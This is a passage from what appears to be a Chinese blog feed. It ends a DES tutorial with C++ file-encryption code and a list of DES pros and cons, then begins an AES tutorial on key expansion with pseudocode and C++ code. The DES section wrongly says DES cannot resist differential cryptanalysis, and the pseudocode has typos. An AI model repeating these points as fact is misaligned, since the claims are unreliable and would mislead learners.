= <span class="built_in">encrypt</span>(plain);</span><br><span class="line">out.<span class="built_in">write</span>((<span class="type">char</span>*)&amp;cipher, <span class="built_in">sizeof</span>(cipher));</span><br><span class="line">plain.<span class="built_in">reset</span>();  <span class="comment">// 置0</span></span><br><span class="line">&#125;</span><br><span class="line">in.<span class="built_in">close</span>();</span><br><span class="line">out.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密 cipher.txt，并写入图片 flower1.jpg</span></span><br><span class="line">in.<span class="built_in">open</span>(<span class="string">&quot;D://cipher.txt&quot;</span>, ios::binary);</span><br><span class="line">out.<span class="built_in">open</span>(<span class="string">&quot;D://flower1.jpg&quot;</span>, ios::binary);</span><br><span class="line"><span class="keyword">while</span>(in.<span class="built_in">read</span>((<span class="type">char</span>*)&amp;plain, <span class="built_in">sizeof</span>(plain)))</span><br><span class="line">&#123;</span><br><span class="line">bitset&lt;64&gt; temp  = <span class="built_in">decrypt</span>(plain);</span><br><span class="line">out.<span class="built_in">write</span>((<span class="type">char</span>*)&amp;temp, <span class="built_in">sizeof</span>(temp));</span><br><span class="line">plain.<span class="built_in">reset</span>();  <span class="comment">// 置0</span></span><br><span class="line">&#125;</span><br><span class="line">in.<span class="built_in">close</span>();</span><br><span class="line">out.<span class="built_in">close</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、总结">四、总结</h2><p>5、DES 的优缺点<br>优点：</p><p>安全性高：DES 算法使用密钥进行加密和解密，相同的明文使用不同的密钥加密后得到的密文是不同的。密钥越长，加密的安全性就越高。<br>算法简单：DES 算法的加密和解密过程非简单，基于对称加密，使用相同的 key 进行加解密。<br>适用广泛：DES 算法是最早也是最广泛使用的加密算法之一，被广泛应用于电子商务、电子邮件、虚拟私人网络等领域，具有广泛的适用性和可移植性。<br>缺点：</p><p>密钥长度较短：DES 算法使用 56 位密钥，虽然在当时足够安全，但在当前计算机的处理能力下，已经不足以保证加密的安全性，易受到暴力破解攻击。<br>无法抵抗差分密码分析攻击：DES 算法无法抵抗差分密码分析攻击，这种攻击可以通过比较相同明文的密文，分析加密算法的行为并推断出密钥。<br>比较慢：由于 DES 算法是一种分组密码算法，需要对 64 位的明文进行加密，加密速度比较慢，不适用于对大量数据进行实时加密和解密。</p>]]></content>
    
    
    <summary type="html">DES密码学分析及C++实现DES加密解密</summary>
    
    
    
    <category term="密码学" scheme="https://nonevector.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="DES" scheme="https://nonevector.top/tags/DES/"/>
    
  </entry>
  
  <entry>
    <title>密码学之AES算法</title>
    <link href="https://nonevector.top/posts/3.html"/>
    <id>https://nonevector.top/posts/3.html</id>
    <published>2023-10-14T07:52:58.852Z</published>
    <updated>2023-11-29T03:35:26.563Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、AES-算法介绍">一、AES 算法介绍</h2><p><code>AES</code> 的全称是 <code>Advanced Encryption Standard</code>，意思是高级加密标准。它的出现主要是为了取代 <code>DES</code> 加密算法的，因为我们都知道 <code>DES</code> 算法的密钥长度是 <code>56Bit</code>，因此算法的理论安全强度是 <code>2</code> 的 <code>56</code> 次方。但二十世纪中后期正是计算机飞速发展的阶段，元器件制造工艺的进步使得计算机的处理能力越来越强，虽然出现了 <code>3DES</code> 的加密方法，但由于它的加密时间是 <code>DES</code> 算法的 3 倍多，64Bit 的分组大小相对较小，所以还是不能满足人们对安全性的要求。于是 1997 年 1 月 2 号，美国国家标准技术研究所宣布希望征集高级加密标准，用以取代 <code>DES</code>。AES 也得到了全世界很多密码工作者的响应，先后有很多人提交了自己设计的算法。最终有 5 个候选算法进入最后一轮：<code>Rijndael</code>，<code>Serpent</code>，<code>Twofish</code>，<code>RC6 </code>和 <code>MARS</code>。最终经过安全性分析、软硬件性能评估等严格的步骤，<code>Rijndael </code>算法获胜。</p><p>在密码标准征集中，所有 AES 候选提交方案都必须满足以下标准：</p><ul><li>分组大小为 128 位的分组密码。</li><li>必须支持三种密码标准：128 位、192 位和 256 位。</li><li>比提交的其他算法更安全。</li><li>在软件和硬件实现上都很高效。</li></ul><p><code>AES</code> 密码与分组密码 Rijndael 基本上完全一致，Rijndael 分组大小和密钥大小都可以为 128 位、192 位和 256 位。然而 <code>AES </code>只要求分组大小为 128 位，因此只有分组长度为 128Bit 的 Rijndael 才称为 <code>AES </code>算法。本文只对分组大小 128 位，密钥长度也为 128 位的 Rijndael 算法进行分析。密钥长度为 192 位和 256 位的处理方式和 128 位的处理方式类似，只不过密钥长度每增加 64 位，算法的循环次数就增加 2 轮，128 位循环 10 轮、192 位循环 12 轮、256 位循环 14 轮。</p><hr><h2 id="二、原理">二、原理</h2><h3 id="1-流程">1.流程</h3><p><code>AES </code>算法（即 Rijndael 算法）是一个对称分组密码算法。数据分组长度必须是 128 bits，使用的密钥长度为 128，192 或 256 bits。对于三种不同密钥长度的 <code>AES </code>算法，分别称为“AES-128”、“AES-192”、“AES-256”。（Rijndael 的设计还可以处理其它的分组长度和密钥长度，但 <code>AES </code>标准中没有采用）</p><p>下图是 <code>AES </code>加密解密的整体流程图：<br><img src="https://cdn.acwing.com/media/article/image/2023/10/21/169037_7a10e78c6f-2.jpg" alt="2.jpg"></p><hr><h3 id="2-注意">2.注意</h3><ol><li><p><strong>这里用的是<code>AES-128</code></strong>，因此密钥长度<code>128</code>，<code>AES</code>迭代次数<code>10</code>轮</p></li><li><p>AES 的处理单位是字节，128 位的输入明文分组 P 和输入密钥 K 都被分成 16 个字节，一般地，明文分组用以字节为单位的正方形矩阵描述，称为状态(State)矩阵<br><img src="https://cdn.acwing.com/media/article/image/2023/10/21/169037_b2417bdc6f-4.jpg" alt="4.jpg"></p><blockquote><p><strong>注意矩阵中字节的排序顺序是从上到下，从左到右</strong></p></blockquote></li><li><p>这里我们需要知道 3 个符号：<code>Nb</code>—— 状态 State 包含的列（32-bit 字）的个数，也就是说 <code>Nb=4</code>；<code>Nk</code>—— 密钥包含的 32-bit 字的个数，也就是说 <code>Nk=4，6 或 8</code>；<code>Nr</code>—— 加密的轮数，对于不同密钥长度，轮数不一样，具体如下图所示：<br><img src="https://cdn.acwing.com/media/article/image/2023/10/21/169037_89de3f636f-3.jpg" alt="3.jpg"></p><blockquote><p>注意只有<code>Nr - 1</code>次是相同的，最后一轮都少了列混合</p></blockquote></li></ol><p>下面分为<strong>密钥扩展</strong>、<strong>分组加密</strong>、<strong>分组解密</strong>三个部分来讲 <code>AES</code> 算法，C++代码在后面</p><hr><h2 id="三、AES-算法">三、AES 算法</h2><h3 id="1-密钥扩展">1.密钥扩展</h3><h4 id="1-1-流程">1.1 流程</h4><p><code>AES</code> 算法通过密钥扩展程序（Key Expansion）将用户输入的密钥<code> K</code> 扩展生成 <code>Nb(Nr+1)</code>个字，存放在一个线性数组<code>w[Nb*(Nr+1)]</code>中。具体如下：</p><ol><li><p>位置变换函数<code>RotWord()</code>，接受一个字<code> [a0, a1, a2, a3]</code> 作为输入，循环左移一个字节后输出 <code>[a1, a2, a3, a0]</code>。</p></li><li><p><code>S</code>盒变换函数<code>SubWord()</code>，接受一个字 <code>[a0, a1, a2, a3]</code> 作为输入。<code>S</code>盒是一个 16x16 的表，其中每一个元素是一个字节。对于输入的每一个字节，前四位组成十六进制数 <code>x</code> 作为行号，后四位组成的十六进制数 <code>y</code> 作为列号，查找表中对应的值。最后函数输出 <code>4</code> 个新字节组成的 32-bit 字。</p></li><li><p>轮常数<code>Rcon[]</code>，如何计算的就不说了，直接把它当做常量数组。</p></li><li><p>扩展密钥数组<code>w[]</code>的前 <code>Nk </code>个元素就是外部密钥<code> K</code>，以后的元素<code>w[i]</code>等于它前一个元素<code>w[i-1]</code>与前第<code> Nk</code> 个元素<code>w[i-Nk]</code>的异或，即<code>w[i] = w[i-1] XOR w[i-Nk]</code>；但若 <code>i </code>为 <code>Nk</code> 的倍数，则<code>w[i] = w[i-Nk] XOR SubWord(RotWord(w[i-1])) XOR Rcon[i/Nk-1]</code>。<br><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_88dd1f7870-2.png" alt="2.png"><br><img src="https://cdn.acwing.com/media/article/image/2023/10/22/169037_8c5e12a770-3.png" alt="3.png"></p></li></ol><hr><h4 id="1-2-伪代码">1.2 伪代码</h4><h5 id="1-2-1-N-k-6-（主）">1.2.1 $ N_k &lt;= 6$（主）</h5><blockquote><p>即适合 AES-128 和 AES-192，这里只以 AES-128 为例子</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">KeyExpansion</span>(byteKey[<span class="number">4</span> * Nk], W[Nb * (Nr + <span class="number">1</span>)]) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Nk; i++)</span><br><span class="line">        W[i] = (Key[<span class="number">4</span> * i], Key[<span class="number">4</span> * i + <span class="number">1</span>], Key[<span class="number">4</span> * i + <span class="number">2</span>], Key[<span class="number">4</span> * i + <span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = Nk; i &lt; Nb * (Nr + <span class="number">1</span>); i++) &#123;</span><br><span class="line">        temp = W[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (i % Nk = = <span class="number">0</span>)</span><br><span class="line">            temp = <span class="built_in">SubByte</span>(<span class="built_in">RotByte</span>(temp)) ^ Rcon[i / Nk];</span><br><span class="line">        W[i] = W[i - Nk] ^ temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1-2-2-N-k-6-（略）">1.2.2 $ N_k &gt; 6$（略）</h5><blockquote><p>即适合 AES-256，本篇文章不予实现，但给出伪代码</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">KeyExpansion</span>(byte Key[<span class="number">4</span> * Nk], W[Nb * (Nr + <span class="number">1</span>)]) &#123;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Nk; i++)</span><br><span class="line">        W[i] = (Key[<span class="number">4</span> * i], Key[<span class="number">4</span> * i + <span class="number">1</span>], Key[<span class="number">4</span> * i + <span class="number">2</span>], Key[<span class="number">4</span> * i + <span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = Nk; i &lt; Nb * (Nr + <span class="number">1</span>); i++) &#123;</span><br><span class="line">        temp = W[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (i % Nk = = <span class="number">0</span>)</span><br><span class="line">            temp = <span class="built_in">SubByte</span>(<span class="built_in">RotByte</span>(temp)) ^ Rcon[i / Nk];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i % Nk == <span class="number">4</span>)</span><br><span class="line">            temp = <span class="built_in">SubByte</span>(temp);</span><br><span class="line">        W[i] = W[i - Nk] ^ temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1-2-3-N-k-大小的区别区别">1.2.3 $ N_k $大小的区别区别</h5><p>当$ i - 4 $为$ N_k $的整数倍时，须先将前一个子$ W[i - 1]$经过<code>  SubByte</code>变换（S 盒变换）</p><hr><h4 id="1-3-代码实现">1.3 代码实现</h4><h5 id="1-3-1-代码">1.3.1 代码</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;8&gt; byte;</span><br><span class="line"><span class="keyword">typedef</span> bitset&lt;32&gt; word;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> Nr = <span class="number">10</span>;  <span class="comment">// AES-128需要 10 轮加密</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> Nk = <span class="number">4</span>;   <span class="comment">// Nk 表示输入密钥的 word 个数</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> Nb = <span class="number">4</span>;   <span class="comment">// Nb 表示状态 State 包含的列（32-bit 字）的个数，也就是说 Nb=4</span></span><br><span class="line"></span><br><span class="line">byte S_Box[<span class="number">16</span>][<span class="number">16</span>] = &#123;</span><br><span class="line">&#123;<span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>&#125;,</span><br><span class="line">&#123;<span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>&#125;,</span><br><span class="line">&#123;<span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮常数，密钥扩展中用到。（AES-128只需要10轮）</span></span><br><span class="line">word Rcon[<span class="number">10</span>] = &#123;<span class="number">0x01000000</span>, <span class="number">0x02000000</span>, <span class="number">0x04000000</span>, <span class="number">0x08000000</span>, <span class="number">0x10000000</span>,</span><br><span class="line"> <span class="number">0x20000000</span>, <span class="number">0x40000000</span>, <span class="number">0x80000000</span>, <span class="number">0x1b000000</span>, <span class="number">0x36000000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将4个 byte 转换为一个 word.</span></span><br><span class="line"><span class="comment"> * 比如k1 包含十六进制值 0x12，k2 包含 0x34，k3 包含 0x56，k4 包含 0x78。</span></span><br><span class="line"><span class="comment"> * Word 函数将这些字节按照指定的顺序合并成一个 word 对象 result，其十六进制表示为 0x12345678。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">word <span class="title">Word</span><span class="params">(byte&amp; k1, byte&amp; k2, byte&amp; k3, byte&amp; k4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">word <span class="title">result</span><span class="params">(<span class="number">0x00000000</span>)</span></span>;</span><br><span class="line">word temp;</span><br><span class="line">temp = k1.<span class="built_in">to_ulong</span>();  <span class="comment">// K1</span></span><br><span class="line">temp &lt;&lt;= <span class="number">24</span>;</span><br><span class="line">result |= temp;</span><br><span class="line">temp = k2.<span class="built_in">to_ulong</span>();  <span class="comment">// K2</span></span><br><span class="line">temp &lt;&lt;= <span class="number">16</span>;</span><br><span class="line">result |= temp;</span><br><span class="line">temp = k3.<span class="built_in">to_ulong</span>();  <span class="comment">// K3</span></span><br><span class="line">temp &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">result |= temp;</span><br><span class="line">temp = k4.<span class="built_in">to_ulong</span>();  <span class="comment">// K4</span></span><br><span class="line">result |= temp;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  按字节 循环左移一位</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">word <span class="title">RotWord</span><span class="params">(<span class="type">const</span> word&amp; rw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//因为word为32位，所以&#123;a2, a3, a4, 00&#125; | &#123;00, 00, 00, a1&#125;，即把[a0, a1, a2, a3]变成[a1, a2, a3, a0]</span></span><br><span class="line">word high = rw &lt;&lt; <span class="number">8</span>;</span><br><span class="line">word low = rw &gt;&gt; <span class="number">24</span>;</span><br><span class="line"><span class="keyword">return</span> high | low;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  对输入word中的每一个字节进行S-盒变换</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">word <span class="title">SubWord</span><span class="params">(<span class="type">const</span> word&amp; sw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">word temp;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i+=<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> row = sw[i+<span class="number">7</span>]*<span class="number">8</span> + sw[i+<span class="number">6</span>]*<span class="number">4</span> + sw[i+<span class="number">5</span>]*<span class="number">2</span> + sw[i+<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> col = sw[i+<span class="number">3</span>]*<span class="number">8</span> + sw[i+<span class="number">2</span>]*<span class="number">4</span> + sw[i+<span class="number">1</span>]*<span class="number">2</span> + sw[i];</span><br><span class="line">byte val = S_Box[row][col];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">8</span>; ++j)</span><br><span class="line">temp[i+j] = val[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  密钥扩展函数 - 对128位密钥进行扩展得到 w[4*(Nr+1)]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">KeyExpansion</span><span class="params">(byte key[<span class="number">4</span>*Nk], word w[Nb*(Nr+<span class="number">1</span>)])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">word temp;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// w[]的前4个就是输入的key（注意矩阵里面的排序是从上到下，从左到右</span></span><br><span class="line"><span class="keyword">while</span>(i &lt; Nk)</span><br><span class="line">&#123;</span><br><span class="line">w[i] = <span class="built_in">Word</span>(key[<span class="number">4</span>*i], key[<span class="number">4</span>*i+<span class="number">1</span>], key[<span class="number">4</span>*i+<span class="number">2</span>], key[<span class="number">4</span>*i+<span class="number">3</span>]);</span><br><span class="line">++i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">i = Nk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">4</span>*(Nr+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">temp = w[i<span class="number">-1</span>]; <span class="comment">// 记录前一个word</span></span><br><span class="line"><span class="keyword">if</span>(i % Nk == <span class="number">0</span>)</span><br><span class="line">w[i] = w[i-Nk] ^ <span class="built_in">SubWord</span>(<span class="built_in">RotWord</span>(temp)) ^ Rcon[i/Nk<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">w[i] = w[i-Nk] ^ temp;</span><br><span class="line">++i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">byte key[<span class="number">16</span>] = &#123;<span class="number">0x2b</span>, <span class="number">0x7e</span>, <span class="number">0x15</span>, <span 